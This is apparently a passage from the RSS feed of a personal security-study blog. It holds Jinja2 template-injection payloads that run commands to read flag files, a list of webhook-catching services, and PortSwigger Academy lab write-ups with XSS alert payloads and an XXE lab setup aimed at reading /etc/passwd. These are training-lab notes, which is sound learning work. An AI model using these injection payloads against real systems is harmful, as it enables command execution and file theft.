{{().__class__.__bases__[0].__subclasses__()[138].__init__.__globals__[&amp;#39;execl&amp;#39;](&amp;#34;/bin/cat&amp;#34;, &amp;#34;cat&amp;#34;, &amp;#34;./flag.txt&amp;#34;)}}
{{().__class__.__bases__[0].__subclasses__()[138].__init__.__globals__[&amp;#39;popen&amp;#39;](&amp;#34;cat /flag.txt&amp;#34;)}}
{{().__class__.__bases__[0].__subclasses__()[138].__init__.__globals__[&amp;#39;execl&amp;#39;](&amp;#34;/bin/cat&amp;#34;, &amp;#34;cat&amp;#34;, file.lower())}}
{{().__class__.__bases__[0].__subclasses__()[138].__init__.__globals__[&amp;#39;spawnl&amp;#39;](&amp;#39;P_WAIT&amp;#39;, &amp;#34;/bin/cat&amp;#34;, &amp;#34;cat&amp;#34;, file.lower())}}
&lt;/code>&lt;/pre>&lt;/li>
&lt;/ul>
&lt;h2 id="others">
 Others
 &lt;a class="anchor" href="#others">#&lt;/a>
&lt;/h2>
&lt;ul>
&lt;li>wasm $\to$ c: &lt;a href="https://github.com/WebAssembly/wabt">wabt&lt;/a>
&lt;pre tabindex="0">&lt;code class="language-bash!" data-lang="bash!"># 按照說明build完後進到./build
$ ./wasm2c {wasm file path} -o {output c file path}
&lt;/code>&lt;/pre>&lt;/li>
&lt;li>Webhook
&lt;a href="https://webhook.site/">Webhook.site&lt;/a>
&lt;a href="https://beeceptor.com/">Beeceptor&lt;/a>
&lt;a href="https://ngrok.com/">Ngrok&lt;/a>&lt;/li>
&lt;/ul></description></item><item><title>XSS - APPRENTICE</title><link>https://bernie6401.github.io/docs/security/practice/portswigger-web-security-academy/xss/xss---apprentice/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/security/practice/portswigger-web-security-academy/xss/xss---apprentice/</guid><description>&lt;h1 id="xss---apprentice">
 XSS - APPRENTICE
 &lt;a class="anchor" href="#xss---apprentice">#&lt;/a>
&lt;/h1>
&lt;h6 id="tags-portswigger-web-security-academy-web">
 tags: &lt;code>Portswigger Web Security Academy&lt;/code> &lt;code>Web&lt;/code>
 &lt;a class="anchor" href="#tags-portswigger-web-security-academy-web">#&lt;/a>
&lt;/h6>
&lt;p>[TOC]&lt;/p>
&lt;h2 id="lab-reflected-xss-into-html-context-with-nothing-encodedzero">
 Lab: Reflected XSS into HTML context with nothing encoded:zero:
 &lt;a class="anchor" href="#lab-reflected-xss-into-html-context-with-nothing-encodedzero">#&lt;/a>
&lt;/h2>
&lt;ul>
&lt;li>Description: This lab contains a simple reflected cross-site scripting vulnerability in the search functionality.&lt;/li>
&lt;li>Goal: To solve the lab, perform a cross-site scripting attack that calls the alert function.&lt;/li>
&lt;/ul>
&lt;h3 id="exp">
 Exp
 &lt;a class="anchor" href="#exp">#&lt;/a>
&lt;/h3>
&lt;p>Payload: &lt;code>&amp;lt;script&amp;gt;alert(123)&amp;lt;/script&amp;gt;&lt;/code>
:::spoiler Success Screenshot
&lt;img src="https://i.imgur.com/tvfxD4P.png" alt="" />
:::&lt;/p>
&lt;hr>
&lt;h2 id="lab-stored-xss-into-html-context-with-nothing-encoded">
 Lab: Stored XSS into HTML context with nothing encoded
 &lt;a class="anchor" href="#lab-stored-xss-into-html-context-with-nothing-encoded">#&lt;/a>
&lt;/h2>
&lt;ul>
&lt;li>Description: This lab contains a stored cross-site scripting vulnerability in the comment functionality.&lt;/li>
&lt;li>Goal: To solve this lab, submit a comment that calls the alert function when the blog post is viewed.&lt;/li>
&lt;/ul>
&lt;h3 id="exp-1">
 Exp
 &lt;a class="anchor" href="#exp-1">#&lt;/a>
&lt;/h3>
&lt;p>You need to click into one post and comment something that contained script tag.
Payload: &lt;code>&amp;lt;script&amp;gt;alert(123)&amp;lt;/script&amp;gt;&lt;/code>
:::spoiler Success Screenshot
&lt;img src="https://i.imgur.com/aArBCbN.png" alt="" />
:::&lt;/p></description></item><item><title>XXE - APPRENTICE</title><link>https://bernie6401.github.io/docs/security/practice/portswigger-web-security-academy/xxe/xxe---apprentice/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/security/practice/portswigger-web-security-academy/xxe/xxe---apprentice/</guid><description>&lt;h1 id="xxe---apprentice">
 XXE - APPRENTICE
 &lt;a class="anchor" href="#xxe---apprentice">#&lt;/a>
&lt;/h1>
&lt;h6 id="tags-portswigger-web-security-academy-web">
 tags: &lt;code>Portswigger Web Security Academy&lt;/code> &lt;code>Web&lt;/code>
 &lt;a class="anchor" href="#tags-portswigger-web-security-academy-web">#&lt;/a>
&lt;/h6>
&lt;ul>
&lt;li>Description: This lab has a &amp;ldquo;Check stock&amp;rdquo; feature that parses XML input and returns any unexpected values in the response.&lt;/li>
&lt;li>Goal: To solve the lab, inject an XML external entity to retrieve the contents of the &lt;code>/etc/passwd&lt;/code> file.&lt;/li>
&lt;/ul>
&lt;h2 id="lab-exploiting-xxe-using-external-entities-to-retrieve-files">
 Lab: Exploiting XXE using external entities to retrieve files
 &lt;a class="anchor" href="#lab-exploiting-xxe-using-external-entities-to-retrieve-files">#&lt;/a>
&lt;/h2>
&lt;h3 id="recon">
 Recon
 &lt;a class="anchor" href="#recon">#&lt;/a>
&lt;/h3>
&lt;ol>
&lt;li>Use Burp Suite to intercept package
&lt;img src="https://i.imgur.com/gMn3Cbu.png" alt="" />
You can notice that it use a normal xml format.&lt;/li>
&lt;/ol>
&lt;h3 id="exp---inject-directly">
 Exp - Inject Directly
 &lt;a class="anchor" href="#exp---inject-directly">#&lt;/a>
&lt;/h3>
&lt;p>Exploit Payload:&lt;/p></description></item></channel></rss>